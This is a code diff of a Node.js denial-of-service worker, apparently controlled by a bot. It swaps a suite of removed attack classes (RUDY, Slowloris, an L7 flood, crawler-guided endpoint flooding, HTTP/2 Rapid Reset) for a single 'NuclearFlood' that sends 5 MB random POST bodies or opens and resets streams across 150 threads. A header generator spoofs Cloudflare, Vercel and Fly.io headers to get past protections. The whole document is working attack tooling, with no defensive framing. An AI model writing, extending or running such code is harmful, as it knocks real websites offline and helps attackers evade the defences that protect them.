@@ -3,6 +3,7 @@ const https = require('https');
 const http2 = require('http2');
 const { URL } = require('url');
 const got = require('got');
+const crypto = require('crypto');
 
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
@@ -47,23 +48,6 @@ function generateRandomString(length) {
     for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); }
     return result;
 }
-
-/**
- * Wraps a promise with a timeout.
- * @param {Promise} promise The promise to wrap.
- * @param {number} ms The timeout in milliseconds.
- * @returns {Promise} A new promise that rejects if the original promise doesn't resolve/reject within `ms`.
- */
-const withTimeout = (promise, ms) => {
-    return new Promise((resolve, reject) => {
-        const timeoutId = setTimeout(() => {
-            reject(new Error(`Promise timed out after ${ms} ms`));
-        }, ms);
-
-        promise.then(res => { clearTimeout(timeoutId); resolve(res); })
-               .catch(err => { clearTimeout(timeoutId); reject(err); });
-    });
-};
 
 class BypassGenerator {
     constructor() {
@@ -116,10 +100,8 @@ class BypassGenerator {
         const referer = getRandomElement(referers);
         const origin = new URL(referer).origin;
 
-        // Simulate different request contexts to bypass behavioral analysis
         const dest = getRandomElement(this.fetchDest);
         const mode = getRandomElement(this.fetchMode);
-        // 'navigate' mode usually comes from 'none' or 'cross-site'
         const site = (mode === 'navigate') ? getRandomElement(['none', 'cross-site']) : getRandomElement(this.fetchSite);
 
         const headers = {
@@ -140,7 +122,18 @@ class BypassGenerator {
             'Via': `1.1 ${randomIp}`
         };
 
-        // Randomly add headers to increase fingerprinting difficulty
+        if (Math.random() < 0.5) {
+            headers['CF-Connecting-IP'] = randomIp;
+        }
+        if (Math.random() < 0.3) {
+            headers['CF-IPCountry'] = 'US';
+        }
+        if (Math.random() < 0.4) {
+            headers['X-Vercel-Id'] = `sfo1::${generateRandomString(5)}-${Date.now()}-${generateRandomString(12)}`;
+        }
+        if (Math.random() < 0.2) {
+            headers['Fly-Request-Id'] = generateRandomString(22);
+        }
         if (Math.random() > 0.4) {
             headers['origin'] = origin;
         }
@@ -202,303 +195,7 @@ class BypassGenerator {
     }
 }
 
-/**
- * "AI" Path Finder: A simple crawler to discover attackable endpoints.
- * It fetches the base URL, parses for internal links, and filters out static assets.
- */
-class PathFinder {
-    constructor(baseUrl) {
-        try {
-            this.baseUrl = new URL(baseUrl);
-        } catch (e) {
-            this.baseUrl = null;
-        }
-        // Start with the base URL itself as a guaranteed target
-        this.discoveredPaths = new Set([baseUrl]);
-    }
-
-    async discover() {
-        if (!this.baseUrl) {
-            console.error("PathFinder: Invalid base URL provided.");
-            return Array.from(this.discoveredPaths);
-        }
-
-        try { // Use a generic crawler User-Agent to fetch the page content
-            const response = await got(this.baseUrl.href, {
-                timeout: 5000,
-                retry: { limit: 1 },
-                headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }
-            });
-
-            const body = response.body; // --- HTML Parsing for <a> tags ---
-            const linkRegex = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
-            let match;
-
-            while ((match = linkRegex.exec(body)) !== null) {
-                const foundPath = match[1];
-                try {
-                    const absoluteUrl = new URL(foundPath, this.baseUrl.href); // 1. Keep only URLs from the same host
-                    if (absoluteUrl.hostname !== this.baseUrl.hostname) continue;
-
-                    // 2. Filter out links to common static files and anchors
-                    const pathEnd = absoluteUrl.pathname.toLowerCase();
-                    const staticFileExtensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp', '.xml', '.pdf', '.zip', '.rar', '.txt'];
-                    if (staticFileExtensions.some(ext => pathEnd.endsWith(ext))) continue;
-
-                    // 3. Add the cleaned URL (without fragment) to our set
-                    absoluteUrl.hash = ''; // Remove fragment identifiers like #section
-                    this.discoveredPaths.add(absoluteUrl.href);
-
-                } catch (e) { /* Ignore invalid URLs found in hrefs */ }
-            }
-
-            // --- JavaScript Parsing for API paths and routes ---
-            const scriptSrcRegex = /<script[^>]+src="([^"]+)"/gi;
-            const inlineScriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
-            const pathInJsRegex = /(['"`])(\/(?:[a-zA-Z0-9_.\-~/%]+)?)\1/g;
-
-            const scriptProcessingPromises = [];
-
-            // Find and process external scripts
-            let scriptMatch;
-            while ((scriptMatch = scriptSrcRegex.exec(body)) !== null) {
-                scriptProcessingPromises.push(this.processScriptUrl(scriptMatch[1], pathInJsRegex));
-            }
-
-            // Find and process inline scripts
-            let inlineScriptMatch;
-            while ((inlineScriptMatch = inlineScriptRegex.exec(body)) !== null) {
-                const scriptContent = inlineScriptMatch[1];
-                if (scriptContent) {
-                    this.findPathsInJsContent(scriptContent, pathInJsRegex);
-                }
-            }
-
-            // Wait for all external scripts to be fetched and parsed
-            await Promise.all(scriptProcessingPromises);
-
-        } catch (error) {
-            console.error(`PathFinder failed to crawl: ${error.message}. Using base URL only.`);
-        }
-        return Array.from(this.discoveredPaths);
-    }
-
-    async processScriptUrl(scriptPath, pathInJsRegex) {
-        try {
-            const absoluteUrl = new URL(scriptPath, this.baseUrl.href);
-            if (absoluteUrl.hostname !== this.baseUrl.hostname) return;
-
-            const response = await got(absoluteUrl.href, { timeout: 3000, retry: { limit: 1 } });
-            this.findPathsInJsContent(response.body, pathInJsRegex);
-        } catch (e) { /* Ignore errors from fetching/processing scripts */ }
-    }
-
-    findPathsInJsContent(content, pathInJsRegex) {
-        let match;
-        while ((match = pathInJsRegex.exec(content)) !== null) {
-            const foundPath = match[2]; // The captured path group
-            try {
-                if (foundPath.length <= 1 && foundPath !== '/') continue; // Ignore empty or single-slash paths unless it's the root
-                if (foundPath.includes(':') || foundPath.includes('{')) continue; // Simple filter for dynamic routes
-
-                const absoluteUrl = new URL(foundPath, this.baseUrl.href);
-                if (absoluteUrl.hostname !== this.baseUrl.hostname) continue;
-
-                absoluteUrl.hash = '';
-                this.discoveredPaths.add(absoluteUrl.href);
-            } catch (e) { /* Ignore invalid paths */ }
-        }
-    }
-}
-
-class RudyAttack {
-    constructor(targetUrl, threadCount, stats, bypasser, largePayload) {
-        this.targetUrl = targetUrl;
-        this.threadCount = threadCount;
-        this.stats = stats;
-        this.sockets = [];
-        this.largePayload = largePayload;
-        try {
-            this.bypasser = bypasser;
-            this.url = new URL(targetUrl);
-            this.protocol = this.url.protocol === 'https:' ? https : http;
-            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
-        } catch (e) { this.url = null; this.protocol = null; }
-    }
-
-    createConnection() {
-        if (!this.url) return null;
-        this.stats.total++;
-        this.stats.success++; // Optimistically count connection attempt as success
-        const headers = this.bypasser.generateHeaders();
-        headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        headers['Content-Length'] = this.largePayload.length;
-        headers['Connection'] = 'keep-alive';
-
-        const options = {
-            hostname: this.url.hostname,
-            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-            path: this.url.pathname,
-            method: 'POST',
-            headers: headers,
-            agent: this.agent,
-        };
-
-        let timeoutId;
-        const req = this.protocol.request(options, (res) => {
-            // Server responded, which means it's not fully stalled by this socket.
-            res.resume(); // Optimasi: Konsumsi response untuk membebaskan socket
-            if (timeoutId) clearTimeout(timeoutId);
-        });
-        req.on('error', (err) => {
-            this.stats.failed++;
-            this.stats.success--; // Correct the optimistic success count
-            if (timeoutId) clearTimeout(timeoutId);
-        });
-
-        // Send initial small part of the body
-        req.write(this.largePayload.slice(0, 10));
-
-        let bytesSent = 10;
-        const chunkSize = 16; // Send 16 bytes at a time
-
-        const sendSlowChunk = () => {
-            try {
-                if (req.destroyed || bytesSent >= this.largePayload.length) { if (timeoutId) clearTimeout(timeoutId); return; }
-                const chunk = this.largePayload.slice(bytesSent, bytesSent + chunkSize);
-                req.write(chunk);
-                bytesSent += chunkSize;
-            } catch (e) {
-                // If writing to the socket fails, count it as a failure and stop the loop.
-                this.stats.failed++;
-                if (timeoutId) clearTimeout(timeoutId);
-                if (req && !req.destroyed) req.destroy();
-            }
-        };
-
-        const scheduleNextChunk = () => {
-            const fixedInterval = 7000; // Delay tetap 7 detik
-            timeoutId = setTimeout(() => {
-                sendSlowChunk();
-                scheduleNextChunk();
-            }, fixedInterval);
-        };
-        scheduleNextChunk();
-        return { req, timeoutId };
-    }
-
-    start() {
-        for (let i = 0; i < this.threadCount; i++) {
-            const socket = this.createConnection();
-            if (socket) { this.sockets.push(socket); }
-        }
-    }
-
-    stop() {
-        this.sockets.forEach(({ req, timeoutId }) => {
-            if (timeoutId) clearTimeout(timeoutId);
-            if (req && !req.destroyed) req.destroy();
-        });
-        this.sockets = [];
-    }
-}
-
-class SlowlorisAttack {
-    constructor(targetUrl, threadCount, stats, bypasser, largePayload) {
-        this.targetUrl = targetUrl;
-        this.threadCount = threadCount;
-        this.stats = stats;
-        this.sockets = [];
-        this.largePayload = largePayload;
-        try {
-            this.bypasser = bypasser;
-            this.url = new URL(targetUrl);
-            this.protocol = this.url.protocol === 'https:' ? https : http;
-            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
-        } catch (e) { this.url = null; this.protocol = null; }
-    }
-
-    createConnection() {
-        if (!this.url) return null;
-        this.stats.total++;
-        this.stats.success++; // Optimistically count connection attempt as success
-        const headers = this.bypasser.generateHeaders();
-        headers['Connection'] = 'keep-alive';
-        headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        headers['Content-Length'] = this.largePayload.length;
-
-        const options = {
-            hostname: this.url.hostname,
-            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-            path: this.url.pathname,
-            method: 'POST',
-            headers: headers,
-            agent: this.agent,
-        };
-
-        let timeoutId;
-        const req = this.protocol.request(options);
-
-        req.on('error', (err) => {
-            this.stats.failed++;
-            this.stats.success--; // Correct the optimistic success count
-            if (timeoutId) clearTimeout(timeoutId);
-        });
-
-        req.on('response', (res) => {
-            // Server responded, which means it's not fully stalled by this socket.
-            res.resume();
-            if (timeoutId) clearTimeout(timeoutId);
-        });
-
-        // Send initial small part of the body
-        req.write(this.largePayload.slice(0, 10));
-
-        let bytesSent = 10;
-        const chunkSize = 16; // Send 16 bytes at a time
-
-        const sendSlowChunk = () => {
-            try {
-                if (req.destroyed || bytesSent >= this.largePayload.length) { if (timeoutId) clearTimeout(timeoutId); return; }
-                const chunk = this.largePayload.slice(bytesSent, bytesSent + chunkSize);
-                req.write(chunk);
-                bytesSent += chunkSize;
-            } catch (e) {
-                // If writing to the socket fails, count it as a failure and stop the loop.
-                this.stats.failed++;
-                if (timeoutId) clearTimeout(timeoutId);
-                if (req && !req.destroyed) req.destroy();
-            }
-        };
-
-        const scheduleNextChunk = () => {
-            timeoutId = setTimeout(() => {
-                sendSlowChunk();
-                scheduleNextChunk();
-            }, 10000); // Delay tetap 10 detik
-        };
-        scheduleNextChunk();
-
-        return { req, timeoutId };
-    }
-
-    start() {
-        for (let i = 0; i < this.threadCount; i++) {
-            const socket = this.createConnection();
-            if (socket) { this.sockets.push(socket); }
-        }
-    }
-
-    stop() {
-        this.sockets.forEach(({ req, timeoutId }) => {
-            if (timeoutId) clearTimeout(timeoutId);
-            if (req && !req.destroyed) req.destroy();
-        });
-        this.sockets = [];
-    }
-}
-
-class L7Flood {
+class NuclearFlood {
     constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload) {
         this.targetUrl = targetUrl;
         this.threadCount = threadCount;
@@ -509,52 +206,70 @@ class L7Flood {
         this.largePayload = largePayload;
         try {
             this.url = new URL(targetUrl);
-            this.protocol = this.url.protocol === 'https:' ? https : http;
         } catch (e) { this.url = null; }
     }
 
     async sendRequest() {
-        if (!this.url) return;
+        if (!this.url) return null;
         this.stats.total++;
-        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
-        const method = getRandomElement(methods);
-        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
-        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
-        const headers = this.bypasser.generateHeaders();
-        
-        const options = {
-            method: method,
-            headers: headers,
-            http2: true,
-            timeout: { request: 8000 }, // Increased timeout for stability under load
-            retry: { limit: 0 },
-            throwHttpErrors: false,
-        };
 
-        if (['POST', 'PUT'].includes(method)) {
-            // Mix of large brute-force payloads and small, complex evasion payloads
-            if (Math.random() < 0.3) { // 30% chance for large payload
-                options.body = this.largePayload;
-                options.headers['Content-Type'] = 'application/octet-stream';
-                options.headers['Content-Length'] = this.largePayload.length;
-            } else { // 70% chance for small, complex payload
-                const payload = this.bypasser.generateComplexPayload();
-                options.body = payload.body;
-                options.headers['Content-Type'] = payload.contentType;
-                options.headers['Content-Length'] = Buffer.byteLength(payload.body);
-            }
-        }
+        const strategy = Math.random();
 
-        try {
-            await got(this.url.origin + path, options);
-            this.stats.success++;
-        } catch (error) {
-            // A timeout is a sign of success in a DoS attack.
-            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
+        if (strategy < 0.7) {
+            const method = 'POST';
+            const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
+            const headers = this.bypasser.generateHeaders();
+            
+            const randomPayload = crypto.randomBytes(this.largePayload.length);
+
+            const options = {
+                method: method,
+                headers: {
+                    ...headers,
+                    'Content-Type': 'application/octet-stream',
+                    'Content-Length': randomPayload.length,
+                },
+                body: randomPayload,
+                http2: true,
+                timeout: { request: 8000 },
+                retry: { limit: 0 },
+                throwHttpErrors: false,
+            };
+
+            try {
+                await got(this.url.origin + path, options);
                 this.stats.success++;
-            } else {
-                this.stats.failed++;
+            } catch (error) {
+                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
+                    this.stats.success++;
+                } else {
+                    this.stats.failed++;
+                }
             }
+        } else {
+            const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
+            const headers = this.bypasser.generateHeaders();
+
+            const stream = got.stream(this.url.origin + path, {
+                method: 'GET',
+                headers: headers,
+                http2: true,
+                timeout: { request: 8000 },
+                retry: { limit: 0 },
+                throwHttpErrors: false,
+            });
+            stream.on('request', (req) => {
+                req.destroy();
+                this.stats.success++;
+            });
+            stream.on('error', (error) => {
+                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET') {
+                    this.stats.success++;
+                } else {
+                    this.stats.failed++;
+                }
+            });
+            stream.resume();
         }
     }
 
@@ -562,10 +277,7 @@ class L7Flood {
         while (this.running) {
             try {
                 await this.sendRequest();
-            } catch (e) {
-                // Catch any unexpected error in the worker loop to prevent it from crashing.
-                // The internal sendRequest try/catch handles got-specific errors.
-            }
+            } catch (e) {}
             if (this.running && this.delay > 0) {
                 await new Promise(resolve => setTimeout(resolve, this.delay));
             }
@@ -575,7 +287,7 @@ class L7Flood {
     start() {
         this.running = true;
         for (let i = 0; i < this.threadCount; i++) {
-            this.runWorker(); // Launch each worker, don't await
+            this.runWorker();
         }
     }
 
@@ -584,288 +296,67 @@ class L7Flood {
     }
 }
 
-class NuclearFlood extends L7Flood {
-    async sendRequest() {
-        if (!this.url) return;
-        this.stats.total++;
-        const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
-        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
-        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
-        const headers = this.bypasser.generateHeaders();
-
-        const options = {
-            method: method,
-            headers: headers,
-            http2: true,
-            timeout: { request: 8000 }, // Increased timeout for stability under load
-            retry: { limit: 0 },
-            throwHttpErrors: false,
-        };
-
-        // Mix of large brute-force payloads and small, complex evasion payloads
-        if (Math.random() < 0.5) { // 50% chance for large payload in nuclear mode
-            options.body = this.largePayload;
-            options.headers['Content-Type'] = 'application/octet-stream';
-            options.headers['Content-Length'] = this.largePayload.length;
-        } else { // 50% chance for small, complex payload
-            const payload = this.bypasser.generateComplexPayload();
-            options.body = payload.body;
-            options.headers['Content-Type'] = payload.contentType;
-            options.headers['Content-Length'] = Buffer.byteLength(payload.body);
-        }
-
-        try {
-            await got(this.url.origin + path, options);
-            this.stats.success++;
-        } catch (error) {
-            // A timeout is a sign of success in a DoS attack.
-            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
-                this.stats.success++;
-            } else {
-                this.stats.failed++;
-            }
-        }
-    }
-}
-
-class LogicBombAttack extends L7Flood {
-    // This attack uses discovered paths from the "AI" PathFinder to systematically
-    // hit multiple application endpoints with computationally expensive payloads.
-    constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload, discoveredPaths) {
-        super(targetUrl, threadCount, delay, stats, bypasser, largePayload);
-        // If discovery found paths, use them. Otherwise, fall back to the original URL.
-        this.attackPaths = (discoveredPaths && discoveredPaths.length > 0) ? discoveredPaths : [targetUrl];
-        console.log(`LogicBombAttack initialized with ${this.attackPaths.length} targets.`);
-    }
-
-    async sendRequest() {
-        // For each request, pick a random target from the discovered paths.
-        const randomTargetUrl = getRandomElement(this.attackPaths);
-        let currentUrl;
-        try {
-            currentUrl = new URL(randomTargetUrl);
-        } catch (e) {
-            return; // Skip if a bad URL somehow got into the list
-        }
-
-        this.stats.total++;
-
-        const method = 'POST';
-        const path = currentUrl.pathname + currentUrl.search;
-        const headers = this.bypasser.generateHeaders();
-
-        const payload = this.bypasser.generateComplexPayload();
-        headers['Content-Type'] = payload.contentType;
-        headers['Content-Length'] = Buffer.byteLength(payload.body);
-
-        const options = {
-            method,
-            headers,
-            body: payload.body,
-            http2: true,
-            timeout: { request: 8000 }, // Increased timeout for stability under load
-            retry: { limit: 0 },
-            throwHttpErrors: false,
-        };
-        try {
-            await got(currentUrl.origin + path, options);
-            this.stats.success++;
-        } catch (error) {
-            // A timeout is a sign of success in a DoS attack.
-            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
-                this.stats.success++;
-            } else {
-                this.stats.failed++;
-            }
-        }
-    }
-}
-
-class HTTP2RapidResetAttack {
-    constructor(targetUrl, threadCount, stats, bypasser) {
-        this.targetUrl = targetUrl;
-        this.threadCount = threadCount;
-        this.stats = stats;
-        this.bypasser = bypasser;
-        this._running = false;
-        this.sessions = [];
-        try {
-            this.url = new URL(targetUrl);
-            if (this.url.protocol !== 'https:') {
-                console.error("HTTP/2 Rapid Reset requires an HTTPS target.");
-                this.url = null; // Invalidate if not HTTPS
-            }
-        } catch (e) {
-            this.url = null;
-        }
-    }
-
-    start() {
-        if (!this.url) return;
-        this._running = true;
-        for (let i = 0; i < this.threadCount; i++) {
-            this.runWorker();
-        }
-    }
-
-    stop() {
-        this._running = false;
-        this.sessions.forEach(session => {
-            if (session && !session.destroyed) {
-                session.destroy();
-            }
-        });
-        this.sessions = [];
-    }
-
-    runWorker() {
-        if (!this._running) return;
-
-        const authority = this.url.origin;
-        const clientSession = http2.connect(authority);
-        this.sessions.push(clientSession);
-
-        clientSession.on('error', (err) => { /* Errors are expected */ });
-
-        clientSession.on('close', () => {
-            const index = this.sessions.indexOf(clientSession);
-            if (index > -1) this.sessions.splice(index, 1);
-            if (this._running) this.runWorker(); // Reconnect
-        });
-
-        const sendResetBurst = () => {
-            if (!this._running || clientSession.destroyed) return;
-            try {
-                for (let i = 0; i < 100; i++) { // Send a burst of 100 resets
-                    const headers = { ...this.bypasser.generateHeaders(), ':method': 'GET', ':path': this.url.pathname, ':scheme': 'https', ':authority': this.url.hostname };
-                    const stream = clientSession.request(headers);
-                    stream.close(http2.constants.NGHTTP2_CANCEL); // Immediately cancel the stream
-                    stream.on('error', (err) => { /* Ignore stream errors */ });
-                    this.stats.total++;
-                    this.stats.success++;
-                }
-            } catch (e) {
-                this.stats.failed += 100;
-            }
-            // Yield to the event loop to prevent starvation, especially when running with other attacks.
-            // A small delay is better than setImmediate for this purpose.
-            setTimeout(sendResetBurst, 10);
-        };
-        sendResetBurst();
-    }
-}
-
 process.on('message', async ({ targetUrl, duration }) => {
     const threads = 150;
     const l7Delay = 900;
 
-    const PAYLOAD_SIZE = 5 * 1024 * 1024; // 5 MB
-    const largePayload = Buffer.alloc(PAYLOAD_SIZE, 'a');
+    const PAYLOAD_SIZE = 5 * 1024 * 1024;
+    const largePayload = Buffer.alloc(PAYLOAD_SIZE);
 
     const bypasser = new BypassGenerator();
 
-    // --- "AI" Path Discovery Phase ---
-    let discoveredAttackPaths;
-    try {
-        console.log("Starting Path Discovery (max 10s)...");
-        const pathFinder = new PathFinder(targetUrl);
-        // If discovery takes more than 10s, it will time out.
-        discoveredAttackPaths = await withTimeout(pathFinder.discover(), 10000);
-        console.log(`Path Discovery finished. Found ${discoveredAttackPaths.length} paths.`);
-    } catch (error) {
-        console.error(`Path Discovery failed or timed out: ${error.message}. Proceeding with base URL only.`);
-        discoveredAttackPaths = [targetUrl]; // Fallback to the original URL
-    }
+    const stats = { total: 0, success: 0, failed: 0, phase: 'NuclearFlood' };
 
-    const stats = { total: 0, success: 0, failed: 0, phase: 'Combined Attack' };
-
-    // --- Sistem Pelaporan Statistik yang Dioptimalkan ---
-    // Mengirim statistik secara berkala tanpa membebani IPC (Inter-Process Communication)
-    // untuk mencegah kelambatan pada sistem monitoring.
-    const STATS_INTERVAL = 2000; // Kirim data setiap 2 detik untuk mengurangi beban
+    const STATS_INTERVAL = 2000;
     let statsTimeout;
-    let initialReportSent = false; // Flag to ensure the first report is sent to update the 'phase'
+    let initialReportSent = false;
 
     const sendStats = () => {
-        // Kirim statistik jika ada data baru, ATAU jika ini laporan pertama (untuk menginisialisasi UI bot)
         if (!initialReportSent || stats.total > 0 || stats.success > 0 || stats.failed > 0) {
             try {
-                if (process.send) { // Pastikan proses induk masih ada
+                if (process.send) {
                     process.send({ type: 'stats', data: { ...stats } });
-                    initialReportSent = true; // Tandai bahwa laporan awal telah dikirim
+                    initialReportSent = true;
                 }
             } catch (e) {
-                // Proses induk mungkin terputus, hentikan pengiriman statistik
                 if (statsTimeout) clearTimeout(statsTimeout);
                 return;
             }
-            // Reset penghitung setelah mengirim
             stats.total = 0;
             stats.success = 0;
             stats.failed = 0;
         }
-        // Jadwalkan pengiriman berikutnya
         statsTimeout = setTimeout(sendStats, STATS_INTERVAL);
     };
 
     sendStats(); // Mulai loop pelaporan statistik
 
     const totalDurationMs = duration * 1000;
-    const attackers = [];
 
-    // Instantiate all attackers
-    attackers.push(new RudyAttack(targetUrl, threads, stats, bypasser, largePayload));
-    attackers.push(new L7Flood(targetUrl, threads, l7Delay, stats, bypasser, largePayload));
-    attackers.push(new SlowlorisAttack(targetUrl, threads, stats, bypasser, largePayload));
-    attackers.push(new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser, largePayload));
-    attackers.push(new LogicBombAttack(targetUrl, threads, l7Delay, stats, bypasser, null, discoveredAttackPaths));
-    attackers.push(new HTTP2RapidResetAttack(targetUrl, threads, stats, bypasser));
+    console.log(`[${new Date().toISOString()}] Starting attacker: NuclearFlood for ${duration}s`);
+    const attacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser, largePayload);
 
-    // --- Rolling Attack Sequencer ---
-    // Runs one attack type at a time to prevent event loop starvation and ensure each attack runs effectively.
-    const validAttackers = attackers.filter(a => a && (a.url || a.sockets)); // Filter out attackers that failed to initialize
-
-    if (validAttackers.length === 0) {
-        console.error("No valid attackers could be initialized. Stopping worker.");
+    if (!attacker.url) {
+        console.error("NuclearFlood attacker could not be initialized. Invalid URL. Stopping worker.");
         if (statsTimeout) clearTimeout(statsTimeout);
         return;
     }
 
-    const timePerAttacker = totalDurationMs / validAttackers.length;
-    let currentAttackerIndex = 0;
+    try {
+        attacker.start();
+    } catch (e) {
+        console.error(`Failed to start NuclearFlood`, e);
+    }
 
-    const runSequence = async () => {
-        // Stop condition: all attackers have run their course.
-        if (currentAttackerIndex >= validAttackers.length) {
-            console.log("Attack sequence finished.");
-            if (statsTimeout) clearTimeout(statsTimeout);
-            return;
-        }
-
-        const attacker = validAttackers[currentAttackerIndex];
-        stats.phase = attacker.constructor.name; // Update the phase for monitoring
-        console.log(`[${new Date().toISOString()}] Starting attacker: ${stats.phase} for ${Math.round(timePerAttacker / 1000)}s`);
-
-        try {
-            attacker.start();
-        } catch (e) {
-            console.error(`Failed to start ${stats.phase}`, e);
-        }
-
-        // Wait for the allocated time slice for this attacker
-        await new Promise(resolve => setTimeout(resolve, timePerAttacker));
-
-        console.log(`[${new Date().toISOString()}] Stopping attacker: ${stats.phase}`);
+    const attackStopper = setTimeout(() => {
+        console.log(`[${new Date().toISOString()}] Stopping attacker: NuclearFlood`);
         attacker.stop();
+        if (statsTimeout) clearTimeout(statsTimeout);
+    }, totalDurationMs);
 
-        currentAttackerIndex++;
-        runSequence(); // Schedule the next attacker in the sequence
-    };
-
-    runSequence(); // Start the attack sequence
-
-    // Hentikan loop statistik jika proses diputuskan oleh induk
     process.on('disconnect', () => {
         if (statsTimeout) clearTimeout(statsTimeout);
+        if (attackStopper) clearTimeout(attackStopper);
+        if (attacker) attacker.stop();
     });
 });
